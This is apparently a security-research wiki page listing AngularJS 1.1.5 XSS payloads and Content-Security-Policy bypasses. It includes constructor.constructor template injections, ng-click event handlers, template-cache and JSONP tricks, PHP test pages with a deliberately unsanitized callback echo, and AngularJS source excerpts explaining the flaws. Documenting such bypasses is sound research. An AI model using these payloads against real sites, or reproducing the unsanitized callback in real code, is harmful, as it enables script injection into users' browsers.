#summary One-sentence summary of this page.

= Introduction =

Add your content here.


= Details =

Add your content here.  Format your content with:
  * Text in *bold* or _italic_
  * Headings, paragraphs, and lists
  * Automatic links to other wiki pages

= No CSP =

== XSS in Template ==

{{{
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<div class="ng-app">
{{constructor.constructor('alert(1)')()}}
</div>
}}}

== XSS via class-attribute ==

{{{
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<div class="ng-app">
    <b class="ng-style: {x:constructor.constructor('alert(1)')()};" />
</div>
}}}

== XSS via data attributes ==

{{{
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<b data-ng-app data-ng-style="constructor.constructor('alert(1)')()" />
}}}

= CSP Bypasses =

== XSS via Click ==

{{{
<?php
header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
header('Set-Cookie: abc=123');
?><!doctype html>
<html ng-app ng-csp>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
</head>
<body ng-click="$event.view.alert(1)" onclick="alert(2)">Click me
}}}

== Same via data attribute ==

{{{
<?php
header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
header('Set-Cookie: abc=123');
?><!doctype html>
<html ng-app ng-csp>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
</head>
<body data-ng-click="$event.view.alert(1)" onclick="alert(2)">Click me
}}}

== XSS via template cache ==

{{{
<?php
header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
header('Set-Cookie: abc=123');
?><!doctype html>
<html ng-csp ng-app="foo">
<head>
<script
src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<script src="test.js"></script>
</head>
<body>
<div>
  <ng-include src="'one.html'"></ng-include>
</div>
</body>
</html>
}}}

{{{
var foo = angular.module("foo", []);
foo.run(['$templateCache', function($templateCache) {
    $templateCache.put('one.html', '<h1 data-ng-click="$event.view.alert(1)">Click me</h1>');
}]);
}}}

== XSS with overlay ==

{{{
var foo = angular.module("foo", []);
foo.run(['$templateCache', function($templateCache) {
    $templateCache.put('one.html', '<h1 data-ng-style="{border: \'1000px solid red\'}" data-ng-mouseover="$event.view.alert(1)">Click me</h1>');
}]);
}}}

== XSS via JSON Callback ==

{{{
<?php
header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
header('Set-Cookie: abc=123');
?><!doctype html>
<html ng-app ng-csp>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<script src="test.js"></script>
</head>
<body>
<div ng-controller="FetchCtrl">
<input type="text" ng-model="url" size="80" />
<button ng-click="fetch()">fetch</button>
</div>
</body>
</html>
}}}

{{{
function FetchCtrl($scope, $http, $templateCache) {
    $scope.method = 'JSONP';
    $scope.fetch = function() {
    $scope.code = null;
    $scope.response = null;
    $http({method: $scope.method, url: $scope.url, cache: $templateCache}).
    	success(function(data, status) {
    		$scope.status = status;
    		$scope.data = data;
    	})
    };
    $scope.updateModel = function(method, url) {
    	$scope.method = method;
    	$scope.url = url;
 	};
}
function foo(){
	alert('JSON callback received')
}
}}}

{{{
<?php echo $_GET['callback']; ?>({"name":"Super Hero","salutation":"Namaskar","greeting":"Namaskar Super Hero!"});
}}}

== Flaws == 

 * Injected payload bound to an event that executes in the permitted scope
 * JSONP actually attaches an element to the DOM - that contains the injected payload - thus bypasses CSP


== Eval via Function (no CSP) ==

{{{
    function getterFn(path, csp) {
        if (getterFnCache.hasOwnProperty(path)) {
            return getterFnCache[path];
        }
        
        var pathKeys = path.split('.'), 
        pathKeysLength = pathKeys.length, 
        fn;
        
        if (csp) {
            fn = (pathKeysLength < 6) 
            ? cspSafeGetterFn(pathKeys[0], pathKeys[1], pathKeys[2], pathKeys[3], pathKeys[4]) 
            : function(scope, locals) {
                var i = 0, val;
                do {
                    val = cspSafeGetterFn(
                    pathKeys[i++], pathKeys[i++], pathKeys[i++], pathKeys[i++], pathKeys[i++]
                    )(scope, locals);
                    
                    locals = undefined; // clear after first iteration
                    scope = val;
                } while (i < pathKeysLength);
                return val;
            }
        } else {
            var code = 'var l, fn, p;\n';
            forEach(pathKeys, function(key, index) {
                code += 'if(s === null || s === undefined) return s;\n' + 
                'l=s;\n' + 
                's=' + (index 
                // we simply dereference 's' on any .dot notation
                ? 's' 
                // but if we are first then we check locals first, and if so read it first
                : '((k&&k.hasOwnProperty("' + key + '"))?k:s)') + '["' + key + '"]' + ';\n' + 
                'if (s && s.then) {\n' + 
                ' if (!("$$v" in s)) {\n' + 
                ' p=s;\n' + 
                ' p.$$v = undefined;\n' + 
                ' p.then(function(v) {p.$$v=v;});\n' + 
                '}\n' + 
                ' s=s.$$v\n' + 
                '}\n';
            });
            code += 'return s;';
            fn = Function('s', 'k', code); // s=scope, k=locals
            fn.toString = function() {
                return code;
            };
        }
        
        return getterFnCache[path] = fn;
    }
}}}

== "Eval" via Event Binding (CSP) ==

{{{
var ngEventDirectives = {};
forEach(
  'click dblclick mousedown mouseup mouseover mouseout mousemove mouseenter mouseleave keydown keyup keypress'.split(' '),
  function(name) {
    var directiveName = directiveNormalize('ng-' + name);
    ngEventDirectives[directiveName] = ['$parse', function($parse) {
      return function(scope, element, attr) {
        var fn = $parse(attr[directiveName]);
        element.bind(lowercase(name), function(event) {
          scope.$apply(function() {
            fn(scope, {$event:event});
          });
        });
      };
    }];
  }
);

[...]

function cspSafeGetterFn(key0, key1, key2, key3, key4) {
  return function(scope, locals) {
    var pathVal = (locals && locals.hasOwnProperty(key0)) ? locals : scope,
        promise;

    if (pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key0];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    if (!key1 || pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key1];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    if (!key2 || pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key2];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    if (!key3 || pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key3];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    if (!key4 || pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key4];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    return pathVal;
  };
}
}}}